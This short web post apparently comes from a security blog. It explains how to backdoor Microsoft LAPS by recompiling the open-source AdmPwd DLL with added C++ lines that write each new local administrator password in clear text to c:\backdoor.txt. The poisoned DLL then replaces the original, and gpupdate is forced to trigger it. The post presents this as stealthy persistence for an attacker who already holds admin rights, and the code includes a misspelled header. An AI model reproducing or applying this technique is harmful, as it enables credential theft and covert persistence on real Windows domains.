<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Poisoning AdmPwd.dll</title>
</head><body>LAPS was based on open <a href="https://github.com/GreyCorbel/admpwd">source solution called “AdmPwd”</a>&nbsp;developed by Jiri Formacek and is a part of microsoft product portfolio since may 2015. The LAPS solution does not have integrity checks or signature verification for dll file (as of this post). AdmPwd solution is compatible with Microsoft’s LAPS, so let’s poison the dll by compiling the project from source and replace it with the original dll. To replace the original dll administrative privilege is required and at this point we assume the user already has gained administrator privilege by LPE or any other means.<br/>
<br/>
Now let’s add these 3-4 lines in the AdmPwd solution and compile the malicious dll. These lines will be added where the new password and time stamp would be reported to the AD.<br/>
<br/>
#These three lines should already be a part of the dll source#<br/>
#include &lt;iostream&gt;<br/>
#include &lt;ffstream&gt;<br/>
using namespace std;<br/>
<br/>
#These lines begin the 'backdoor/persistence' code. Writing password to c:\\backdoor.txt on GP update#<br/>
wofstream backdoor;<br/>
backdoor.open("c:\\backdoor.txt");<br/>
backdoor &lt;&lt; newPwd;<br/>
backdoor.close();<br/>
&nbsp;<br/>
In this way adversary will appear normal, passwords would be synced and will also comply with LAPS policy.<br/>
<br/>
BONUS: Persistence of clear text password *<br/>
*Persistence till the time poisoned dll is unchanged.<br/>
<br/>
Once replaced, run:<br/>
gpupdate /target:computer /force</body></html>